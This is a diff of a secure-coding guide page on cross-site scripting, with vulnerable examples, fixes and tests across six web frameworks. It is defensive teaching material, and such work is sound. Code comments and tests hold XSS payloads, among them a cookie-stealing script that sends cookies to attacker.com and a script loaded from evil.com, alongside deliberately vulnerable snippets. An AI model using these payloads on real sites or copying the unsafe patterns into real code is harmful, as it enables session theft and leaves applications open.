@@ -1,16 +1,16 @@
 ---
 title: "Cross-Site Scripting (XSS)"
 sidebarTitle: "Cross-Site Scripting"
-description: "Learn to prevent XSS in Java, .NET, Node.js, PHP, Python, and Ruby."
+description: "Architectural examples and mitigation for XSS in Django, Spring Boot, Rails, Express, ASP.NET Core, and Laravel."
 icon: "code"
 iconType: "solid"
 ---
 
 ## Overview
-Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious scripts (usually JavaScript) into web pages viewed by other users. These scripts can bypass access controls and perform actions on behalf of the user, such as stealing session cookies, defacing websites, or redirecting the user to malicious sites.
+Cross-Site Scripting (XSS) is a vulnerability that allows an attacker to inject malicious client-side scripts into web pages viewed by other users. Unlike SQLi, which targets the server's database, XSS targets the user's browser, executing scripts in their security context. This can be used to steal session cookies, impersonate users, deface websites, or launch phishing attacks.
 
 ## Business Impact
-XSS can lead to compromised user accounts, data theft (including session tokens and cookies), unauthorized transactions, and significant reputational damage. It breaks the trust between the user and the web application.
+XSS compromises the trust users have in your application. It can lead to widespread account compromise, theft of sensitive user data, unauthorized transactions performed on behalf of the user, and significant reputational damage. It is one of the most prevalent and damaging vulnerabilities for user-facing applications.
 
 <Card title="Reference Details" icon="book-open" iconType="solid">
   **CWE ID:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
@@ -18,163 +18,482 @@ XSS can lead to compromised user accounts, data theft (including session tokens 
   **Severity:** High
 </Card>
 
-## Remediation by Language
-The primary defense against XSS is **context-aware output encoding**. This means properly escaping user-supplied data before it is rendered in the HTML to ensure it is treated as text, not as active content. The specific encoding method depends on where in the page the data is being placed (e.g., inside an HTML tag, an attribute, a JavaScript block, etc.).
+## Framework-Specific Analysis and Remediation
+Modern web frameworks provide strong default protection against XSS through automatic output encoding in their template engines. Vulnerabilities are almost always introduced when developers deliberately disable this protection or manually construct HTML without proper escaping.
 
 <Tabs>
-  <Tab title="Java">
-    ##### Vulnerable Code Examples
-    **Example 1: Reflecting User Input in a JSP**
-    ```jsp
-    // A search term is directly printed to the page
-    <p>You searched for: <%= request.getParameter("query") %></p>
+  <Tab title="Django (Python)">
+    #### Framework Context
+    Django's template engine automatically escapes all variable content by default, providing robust protection against XSS. Vulnerabilities occur when developers use the `|safe` filter or the `mark_safe` utility to intentionally render raw HTML from a variable containing user input.
+
+    #### Vulnerable Scenario 1: User Profile Bio
+    A user can set a profile bio, which is then rendered on their public profile. A developer uses the `|safe` filter to allow "rich HTML" in bios.
+    ```python
+    # profiles/models.py
+    class Profile(models.Model):
+        user = models.OneToOneField(User, on_delete=models.CASCADE)
+        bio = models.TextField()
+
+    # templates/profiles/detail.html
+    {# DANGEROUS: The 'safe' filter disables Django's auto-escaping. #}
+    {# An attacker can set their bio to: <script>document.location='[http://attacker.com/steal?cookie='+document.cookie](http://attacker.com/steal?cookie='+document.cookie)</script> #}
+    <div>
+        {{ profile.bio|safe }}
+    </div>
     ```
-    **Example 2: Storing and Displaying a User Profile Bio**
+
+    #### Vulnerable Scenario 2: Reflected Search Query
+    A search results page displays the user's original query. To highlight the query, the developer constructs HTML manually.
+    ```python
+    # search/views.py
+    from django.utils.safestring import mark_safe
+
+    def search_results(request):
+        query = request.GET.get('q', '')
+        # DANGEROUS: The query is marked as safe without being escaped first.
+        # This renders any HTML or script in the query parameter directly.
+        message = mark_safe(f"Showing results for: <strong>{query}</strong>")
+        return render(request, 'search/results.html', {'message': message})
+    ```
+
+    #### Mitigation and Best Practices
+    Trust Django's default auto-escaping. Never use `|safe` or `mark_safe` on data that originated from a user. If rich text formatting is required, use a library like `django-bleach` to sanitize the HTML, allowing only a safe subset of tags (like `<b>`, `<i>`) and stripping out dangerous ones (`<script>`, `<iframe>`).
+
+    #### Secure Code Example
+    ```python
+    # Using django-bleach to allow safe HTML
+    import bleach
+    from django.utils.safestring import mark_safe
+
+    def save_profile(request):
+        # Define the allowed HTML tags and attributes
+        allowed_tags = ['b', 'i', 'em', 'strong', 'p']
+        
+        # Sanitize the user input before saving to the database
+        cleaned_bio = bleach.clean(request.POST['bio'], tags=allowed_tags)
+        
+        profile.bio = cleaned_bio
+        profile.save()
+
+    # In the template, it is now safe to use |safe
+    # templates/profiles/detail.html
+    <div>
+        {{ profile.bio|safe }}
+    </div>
+    ```
+
+    #### Testing Strategy
+    Write integration tests that submit payloads containing script tags and other HTML into relevant form fields. Assert that when this data is rendered on a page, the HTML is properly escaped (e.g., `<script>` becomes `&lt;script&gt;`) and is not rendered as active content.
+    ```python
+    # profiles/tests.py
+    def test_profile_bio_xss(self):
+        xss_payload = "<script>alert('xss')</script>"
+        self.client.post(reverse('update-profile'), {'bio': xss_payload})
+        
+        response = self.client.get(reverse('profile-detail', args=[self.user.id]))
+        self.assertEqual(response.status_code, 200)
+        
+        # Check that the script tag is escaped, not rendered raw.
+        self.assertContains(response, "&lt;script&gt;alert('xss')&lt;/script&gt;")
+        self.assertNotContains(response, "<script>alert('xss')</script>")
+    ```
+  </Tab>
+  <Tab title="Spring Boot (Java)">
+    #### Framework Context
+    Template engines like Thymeleaf, which are commonly used with Spring Boot, provide automatic, context-aware escaping for HTML, attributes, and JavaScript. Vulnerabilities arise when developers bypass this protection, for example by using `th:utext` (unescaped text) instead of `th:text`.
+
+    #### Vulnerable Scenario 1: Displaying a User's Comment
+    A comment from a user is displayed on a page. The developer uses `th:utext` to allow for what they believe is simple formatting.
+    ```html
+    <div th:each="comment : ${comments}">
+        <p><strong>User:</strong> <span th:text="${comment.authorName}"></span></p>
+        <p th:utext="${comment.content}"></p>
+    </div>
+    ```
+
+    #### Vulnerable Scenario 2: Building HTML in the Controller
+    A controller method builds an HTML string manually to be passed to the view, which is then rendered unsafely.
     ```java
-    // User bio is fetched from the DB and written to the response
-    String bio = user.getBio(); // bio contains "<script>alert(1)</script>"
-    out.println("<div>" + bio + "</div>");
+    // controller/SearchController.java
+    @GetMapping("/search")
+    public String search(@RequestParam String query, Model model) {
+        // DANGEROUS: Manually creating an HTML string with user input.
+        String resultMessage = "<h3>Results for: " + query + "</h3>";
+        model.addAttribute("resultMessage", resultMessage);
+        return "search-results";
+    }
+
+    // templates/search-results.html
+    <div th:utext="${resultMessage}"></div>
     ```
-    ##### Secure Code (Remediation)
-    Use a library like OWASP Java Encoder to perform context-specific encoding.
-    ```jsp
-    <%@ page import="org.owasp.encoder.Encode" %>
-    <p>You searched for: <%= Encode.forHtml(request.getParameter("query")) %></p>
+
+    #### Mitigation and Best Practices
+    Always use the standard, escaping-by-default methods in your template engine (e.g., `th:text` in Thymeleaf). Avoid building HTML strings in your backend code. If rich text is a requirement, use a dedicated library like OWASP Java HTML Sanitizer to clean the user input based on an allow-list policy before storing it.
+
+    #### Secure Code Example
+    ```html
+    <div th:each="comment : ${comments}">
+        <p><strong>User:</strong> <span th:text="${comment.authorName}"></span></p>
+        <p th:text="${comment.content}"></p>
+    </div>
     ```
     ```java
-    // In a Servlet
-    String bio = user.getBio();
-    out.println("<div>" + Encode.forHtml(bio) + "</div>");
+    // Sanitize user input before storing (if rich text is needed)
+    import org.owasp.html.PolicyFactory;
+    import org.owasp.html.Sanitizer;
+
+    PolicyFactory policy = new HtmlPolicyBuilder()
+        .allowElements("b", "i", "p")
+        .toFactory();
+    String safeComment = policy.sanitize(userInputComment);
+    // Now it's safe to store `safeComment` and render it with th:utext
+    ```
+
+    #### Testing Strategy
+    Use Spring's `MockMvc` to perform a request to an endpoint that renders user-controlled data. Assert that the resulting HTML response contains the escaped version of the XSS payload, not the raw script tags.
+    ```java
+    // src/test/java/com/example/PostControllerTest.java
+    @Test
+    void whenViewingPost_commentsShouldBeEscaped() throws Exception {
+        String xssPayload = "<script>window.location='evil.com'</script>";
+        // Assume a service call that returns a comment with the payload
+        
+        mockMvc.perform(get("/posts/1"))
+            .andExpect(status().isOk())
+            .andExpect(content().string(containsString("&lt;script&gt;window.location='evil.com'&lt;/script&gt;")));
+    }
     ```
   </Tab>
-  <Tab title=".NET (C#)">
-    ##### Vulnerable Code Examples
-    **Example 1: Using `Html.Raw` in Razor Pages**
+  <Tab title="ASP.NET Core (C#)">
+    #### Framework Context
+    The Razor engine in ASP.NET Core is secure by default. It automatically HTML-encodes any output from variables (`@Model.UserInput`). Vulnerabilities are introduced when developers explicitly bypass this using `@Html.Raw()` because they want to render HTML stored in the database.
+
+    #### Vulnerable Scenario 1: Custom Welcome Message
+    A user can customize their dashboard welcome message, which is then displayed on login. The developer uses `@Html.Raw()` to allow for HTML formatting.
     ```csharp
-    // The developer explicitly bypasses Razor's built-in encoding
-    @Html.Raw(Model.UserComment)
+    // Pages/Dashboard.cshtml
+    @model DashboardModel
+
+    <h1>Dashboard</h1>
+    <div>
+        @* DANGEROUS: Html.Raw bypasses Razor's encoding. If WelcomeMessage contains *@
+        @* a script, it will execute for the logged-in user. *@
+        @Html.Raw(Model.WelcomeMessage)
+    </div>
     ```
-    **Example 2: Writing to `Response.Write` in Web Forms**
+
+    #### Vulnerable Scenario 2: Rendering Content from a WYSIWYG Editor
+    An article's content is created using a rich-text editor and stored as HTML. This content is then rendered directly on the page.
     ```csharp
-    // Old ASP.NET Web Forms code writing directly to the output stream
-    Response.Write("<h2>Welcome, " + Request.QueryString["name"] + "</h2>");
+    // Models/Article.cs
+    public class Article {
+        public string Title { get; set; }
+        public string HtmlContent { get; set; }
+    }
+
+    // Pages/Article.cshtml
+    <div class="article-body">
+        @Html.Raw(Model.Article.HtmlContent)
+    </div>
     ```
-    ##### Secure Code (Remediation)
-    Trust the default behavior of Razor (`@Model.UserComment`), which automatically encodes output. If you must use `Response.Write`, manually encode the data with `HttpUtility.HtmlEncode`.
+
+    #### Mitigation and Best Practices
+    Avoid `@Html.Raw()` with any data that originated from a user. If you need to render user-supplied rich text, use a robust HTML sanitization library like `HtmlSanitizer`. Configure a policy that allows only safe HTML tags and attributes and run all user content through it before saving it to the database.
+
+    #### Secure Code Example
     ```csharp
-    // In Razor, simply do this:
-    <p>@Model.UserComment</p>
+    // In the controller or service layer when saving the article
+    using Ganss.Xss;
 
-    // In Web Forms, encode manually:
-    Response.Write("<h2>Welcome, " + HttpUtility.HtmlEncode(Request.QueryString["name"]) + "</h2>");
+    var sanitizer = new HtmlSanitizer();
+    // Configure the sanitizer to allow only specific tags like <b>, <i>, <p>
+    sanitizer.AllowedTags.Clear();
+    sanitizer.AllowedTags.Add("b");
+    sanitizer.AllowedTags.Add("i");
+    sanitizer.AllowedTags.Add("p");
+    
+    var untrustedHtml = articleViewModel.HtmlContent;
+    var sanitizedHtml = sanitizer.Sanitize(untrustedHtml);
+    
+    // Save the sanitizedHtml to the database
+    article.HtmlContent = sanitizedHtml;
+    _context.SaveChanges();
+
+    // Now it is safe to use @Html.Raw in the view
+    // Pages/Article.cshtml
+    <div class="article-body">
+        @Html.Raw(Model.Article.HtmlContent)
+    </div>
+    ```
+
+    #### Testing Strategy
+    Write an integration test using `WebApplicationFactory`. The test should create a user/article with a malicious script payload in its content, then request the page where it's rendered. The test should assert that the response body does not contain the raw `<script>` tag.
+    ```csharp
+    // Tests/ArticlePageTests.cs
+    [Fact]
+    public async Task ArticleContent_WithScriptTag_ShouldBeSanitized()
+    {
+        var client = _factory.CreateClient();
+        var xssPayload = "<script>alert(document.cookie)</script><p>safe content</p>";
+        // Code to create an article with the xssPayload...
+        
+        var response = await client.GetAsync($"/articles/{article.Id}");
+        
+        response.EnsureSuccessStatusCode();
+        var responseHtml = await response.Content.ReadAsStringAsync();
+
+        Assert.DoesNotContain("<script>", responseHtml);
+        Assert.Contains("<p>safe content</p>", responseHtml);
+    }
     ```
   </Tab>
-  <Tab title="Node.js">
-    ##### Vulnerable Code Examples
-    **Example 1: Unsafe Template Engine Usage**
-    ```javascript
-    // Some template engines have unsafe methods for raw HTML (e.g., EJS)
-    res.send('<h1>' + req.query.message + '</h1>');
-    ```
-    **Example 2: Setting `innerHTML` in Client-Side JS**
-    ```javascript
-    // A classic client-side DOM XSS vulnerability
-    const urlParams = new URLSearchParams(window.location.search);
-    document.getElementById('greeting').innerHTML = 'Welcome, ' + urlParams.get('name');
-    ```
-    ##### Secure Code (Remediation)
-    Use template engines that encode by default (like Pug or EJS's `<%= %>`). On the client side, set text content using `.textContent` instead of `.innerHTML`.
-    ```javascript
-    // Server-side with EJS
-    res.render('template', { message: req.query.message });
-    // In template.ejs: <p><%= message %></p>
+  <Tab title="Laravel (PHP)">
+    #### Framework Context
+    Laravel's Blade template engine is secure by default, escaping all output rendered with `{{ $variable }}` syntax. The vulnerability is introduced when developers use the `!! $variable !!}` syntax, which explicitly tells Blade not to escape the data.
 
-    // Client-side
-    document.getElementById('greeting').textContent = 'Welcome, ' + urlParams.get('name');
+    #### Vulnerable Scenario 1: Displaying User-Generated Content
+    A user's profile description is displayed on their page. The developer uses the unescaped syntax to allow HTML.
+    ```php
+    // resources/views/profile/show.blade.php
+
+    <div class="profile-description">
+        {{-- DANGEROUS: The !! syntax outputs raw, unescaped HTML. --}}
+        {!! $user->profile->description !!}
+    </div>
+    ```
+
+    #### Vulnerable Scenario 2: Error Message Display
+    A custom error message from a URL parameter is displayed to the user.
+    ```php
+    // routes/web.php
+    Route::get('/error', function (Request $request) {
+        return view('error', ['message' => $request->input('msg')]);
+    });
+
+    // resources/views/error.blade.php
+    <div class="alert alert-danger">
+        {!! $message !!}
+    </div>
+    ```
+
+    #### Mitigation and Best Practices
+    Always use the default `{{ $variable }}` syntax for rendering user-controlled content. This guarantees that any HTML will be safely escaped. If you must render user-supplied HTML, first sanitize it with a trusted library like `HTML Purifier`.
+
+    #### Secure Code Example
+    ```php
+    // resources/views/profile/show.blade.php (Secure Version)
+
+    <div class="profile-description">
+        {{-- SAFE: The default double-brace syntax escapes all HTML. --}}
+        {{ $user->profile->description }}
+    </div>
+    ```
+    ```php
+    // When saving the description, if HTML is needed
+    use Mews\Purifier\Facades\Purifier;
+    
+    public function update(Request $request)
+    {
+        // This will strip out all malicious code (like <script>)
+        // but keep safe tags (like <b>, <p>) based on your config.
+        $cleaned_description = Purifier::clean($request->input('description'));
+        
+        $request->user()->profile->update(['description' => $cleaned_description]);
+    }
+    
+    // It is now safe to use {!! $user->profile->description !!} in the view
+    ```
+    
+    #### Testing Strategy
+    Use Laravel's HTTP testing features to submit a form with an XSS payload. Then, make a request to the page where that data is displayed and use `assertDontSee()` to ensure the raw script is not present and `assertSee()` to check for its HTML-escaped equivalent.
+    ```php
+    // tests/Feature/ProfileSecurityTest.php
+    public function test_user_description_prevents_xss()
+    {
+        $user = User::factory()->create();
+        $xssPayload = '<script>alert("xss")</script>';
+        
+        $this->actingAs($user)
+            ->post('/profile', ['description' => $xssPayload]);
+
+        $response = $this->get('/profile/' . $user->id);
+        
+        $response->assertStatus(200);
+        $response->assertDontSee('<script>alert("xss")</script>');
+        $response->assertSee(e($xssPayload)); // e() is Laravel's escape helper
+    }
     ```
   </Tab>
-  <Tab title="PHP">
-    ##### Vulnerable Code Examples
-    **Example 1: Echoing a URL Parameter**
-    ```php
-    // The 'name' parameter is directly echoed into the HTML body
-    echo "Welcome, " . $_GET['name'];
-    ```
-    **Example 2: Populating a Form Field Value**
-    ```php
-    // A previous search term is put back into a form field without encoding
-    $searchTerm = $_GET['q'];
-    echo "<input type='text' value='" . $searchTerm . "'>";
-    ```
-    ##### Secure Code (Remediation)
-    Use `htmlspecialchars()` to escape HTML entities. For attributes, it's critical to also use `ENT_QUOTES` to handle single and double quotes.
-    ```php
-    // For HTML body
-    echo "Welcome, " . htmlspecialchars($_GET['name']);
+  <Tab title="Express.js (Node.js)">
+    #### Framework Context
+    The security of an Express application depends heavily on the chosen template engine. Engines like Pug escape output by default, while others like EJS require careful use of different tags for escaped (`<%= ... %>`) versus unescaped (`<%- ... %>`) output.
 
-    // For attributes
-    $searchTerm = $_GET['q'];
-    echo "<input type='text' value='" . htmlspecialchars($searchTerm, ENT_QUOTES, 'UTF-8') . "'>";
+    #### Vulnerable Scenario 1: Using Unescaped Output in EJS
+    A "message of the day" is fetched from a database (where it was submitted by a user) and rendered using the unescaped output tag.
+    ```javascript
+    // views/index.ejs
+    
+    <div class="motd">
+        <%- messageOfTheDay %>
+    </div>
     ```
-  </Tab>
-  <Tab title="Python">
-    ##### Vulnerable Code Examples
-    **Example 1: Using `markupsafe.Markup` incorrectly in Flask/Jinja2**
-    ```python
-    # The developer explicitly marks a user-supplied string as safe
-    from markupsafe import Markup
-    @app.route('/user')
-    def user_profile():
-        bio = request.args.get('bio')
-        return render_template_string(f"<div>{Markup(bio)}</div>")
+    ```javascript
+    // routes/index.js
+    app.get('/', (req, res) => {
+        // Assume message is fetched from DB and contains malicious script
+        const message = "Welcome! <script src='[http://evil.com/payload.js](http://evil.com/payload.js)'></script>";
+        res.render('index', { messageOfTheDay: message });
+    });
     ```
-    **Example 2: Manually building HTML**
-    ```python
-    # A simple CGI script building HTML manually
-    message = form.getvalue("message")
-    print("Content-Type: text/html")
-    print()
-    print(f"<html><body><h1>{message}</h1></body></html>")
-    ```
-    ##### Secure Code (Remediation)
-    Trust the default auto-escaping behavior of modern template engines like Jinja2 or Django Templates. If building HTML manually, use `html.escape()`.
-    ```python
-    # In Flask/Jinja2, let the engine handle it
-    @app.route('/user')
-    def user_profile():
-        bio = request.args.get('bio')
-        return render_template_string("<div>{{ user_bio }}</div>", user_bio=bio)
 
-    # Manual HTML building
-    import html
-    message = form.getvalue("message")
-    print("Content-Type: text/html")
-    print()
-    print(f"<html><body><h1>{html.escape(message)}</h1></body></html>")
+    #### Vulnerable Scenario 2: Client-Side DOM XSS
+    The Express backend serves data via an API, and the frontend JavaScript unsafely injects it into the DOM.
+    ```javascript
+    // Express API endpoint
+    app.get('/api/search', (req, res) => {
+        res.json({ resultsHtml: `Your search for "<b>${req.query.q}</b>" returned 0 results.` });
+    });
+
+    // Frontend JavaScript
+    fetch('/api/search?q=<img src=x onerror=alert(1)>')
+        .then(res => res.json())
+        .then(data => {
+            // DANGEROUS: innerHTML executes any scripts within the string.
+            document.getElementById('results').innerHTML = data.resultsHtml;
+        });
+    ```
+
+    #### Mitigation and Best Practices
+    Always use the output-escaping syntax of your chosen template engine (e.g., `<%= ... %>` in EJS). For client-side rendering, never use `.innerHTML` to inject data that contains user input. Instead, use `.textContent` to safely insert text, or use modern frontend frameworks (React, Vue, Angular) which auto-escape by default.
+
+    #### Secure Code Example
+    ```javascript
+    // EJS Template (Secure Version)
+    <div class="motd">
+        <%= messageOfTheDay %>
+    </div>
+    ```
+    ```javascript
+    // Frontend JavaScript (Secure Version)
+    fetch('/api/search?q=test')
+        .then(res => res.json())
+        .then(data => {
+            // SAFE: textContent inserts the string as plain text, not HTML.
+            document.getElementById('results').textContent = `Your search for "${data.query}" returned 0 results.`;
+        });
+    ```
+
+    #### Testing Strategy
+    Use Jest and Supertest to test server-side rendering. Request a page with a script payload in the query parameter and check that the HTML response contains the escaped version. For DOM XSS, use a testing library like Jest with JSDOM to simulate the browser environment and assert that setting `.innerHTML` vs `.textContent` produces the expected (safe) result.
+    ```javascript
+    // tests/rendering.test.js
+    it('should escape HTML in EJS templates', async () => {
+        // This requires setting up a test that renders the EJS view
+        // The assertion would check if the final HTML contains '&lt;script&gt;'
+    });
+
+    // tests/dom.test.js
+    describe('DOM Manipulation', () => {
+        it('should safely set text content', () => {
+            document.body.innerHTML = `<div id="results"></div>`;
+            const div = document.getElementById('results');
+            const payload = "<img src=x onerror=alert('oops')>";
+            div.textContent = payload;
+            
+            // The innerHTML should contain the escaped version of the payload.
+            expect(div.innerHTML).toBe("&lt;img src=x onerror=alert('oops')&gt;");
+        });
+    });
     ```
   </Tab>
   <Tab title="Ruby on Rails">
-    ##### Vulnerable Code Examples
-    **Example 1: Using `html_safe` or `raw`**
-    ```ruby
-    # The developer explicitly tells Rails a string is safe to render as HTML
-    <%= raw(params[:user_input]) %>
-    <%== params[:user_input] %>
-    <%= params[:user_input].html_safe %>
-    ```
-    **Example 2: Unsafe Content Tag**
-    ```ruby
-    # Building a tag with user-controlled content without escaping
-    <%= content_tag(:h1, params[:greeting]) %>
-    ```
-    ##### Secure Code (Remediation)
-    Trust the default behavior of ERB (`<%= %>`), which automatically escapes HTML content. Avoid `raw` and `html_safe` with user input. The `content_tag` helper is safe by default.
-    ```ruby
-    # Default ERB is safe
-    <%= params[:user_input] %>
+    #### Framework Context
+    Rails ERB templates provide automatic HTML escaping for all content rendered with the standard `<%= ... %>` tag. The primary way to introduce an XSS vulnerability is to explicitly bypass this protection using the `raw()` helper or the `.html_safe` method on a string.
 
-    # content_tag is also safe
-    <%= content_tag(:h1, params[:greeting]) %>
+    #### Vulnerable Scenario 1: Using `raw` for a Flash Message
+    A flash message is constructed with user input and then rendered with `raw` to allow for HTML tags like `<strong>`.
+    ```ruby
+    # app/controllers/sessions_controller.rb
+    def create
+        user = User.find_by(email: params[:email])
+        if user
+            # ... login logic ...
+            flash[:success] = "Welcome back, <strong>#{user.name}</strong>!"
+            redirect_to root_path
+        else
+            # ...
+        end
+    end
+
+    # app/views/layouts/application.html.erb
+    <% flash.each do |type, msg| %>
+        <%# DANGEROUS: if user.name contains a script, `raw` will execute it %>
+        <div class="alert alert-<%= type %>"><%= raw(msg) %></div>
+    <% end %>
+    ```
+
+    #### Vulnerable Scenario 2: `.html_safe` on a Helper Method
+    A helper method is created to format a user's bio, but it incorrectly marks the entire string as safe.
+    ```ruby
+    # app/helpers/users_helper.rb
+    module UsersHelper
+      def format_bio(user)
+        # DANGEROUS: The user's bio is concatenated and then the entire string
+        # is marked as safe, bypassing escaping for the bio content.
+        "<em>Bio for #{user.name}:</em> #{user.bio}".html_safe
+      end
+    end
+
+    # app/views/users/show.html.erb
+    <%= format_bio(@user) %>
+    ```
+
+    #### Mitigation and Best Practices
+    Avoid `raw` and `.html_safe` on any string that contains data originating from a user. If you need to build HTML fragments, use helpers like `content_tag` that safely handle content. For user-supplied rich text, use a sanitizer like `Rails-HTML-Sanitizer` (which is built into Rails).
+
+    #### Secure Code Example
+    ```ruby
+    # app/controllers/sessions_controller.rb (Secure Version)
+    def create
+        # ...
+        # SAFE: Let the view handle the HTML structure. Pass raw data.
+        flash[:success_name] = user.name
+        # ...
+    end
+    
+    # app/views/layouts/application.html.erb (Secure Version)
+    <% if flash[:success_name] %>
+        <div class="alert alert-success">
+            Welcome back, <strong><%= flash[:success_name] %></strong>!
+        </div>
+    <% end %>
+    ```
+    ```ruby
+    # app/helpers/users_helper.rb (Secure Version)
+    module UsersHelper
+      def format_bio(user)
+        # SAFE: Use content_tag, which escapes its content argument by default.
+        content_tag(:em, "Bio for #{user.name}:") + " " + content_tag(:p, user.bio)
+      end
+    end
+    ```
+
+    #### Testing Strategy
+    Use RSpec's request specs to simulate a user submitting data with a script payload. Then, visit the page where this data is rendered and inspect the response body. Assert that the body does not contain the raw script but does contain its HTML-escaped version.
+    ```ruby
+    # spec/requests/profile_display_spec.rb
+    require 'rails_helper'
+    
+    RSpec.describe "Profile display", type: :request do
+      it "escapes malicious HTML in user bios" do
+        user = User.create!(name: "test", bio: "<script>console.log('pwned')</script>")
+        
+        get user_path(user)
+        
+        expect(response.body).not_to include("<script>console.log('pwned')</script>")
+        expect(response.body).to include("&lt;script&gt;console.log('pwned')&lt;/script&gt;")
+      end
+    end
     ```
   </Tab>
 </Tabs>
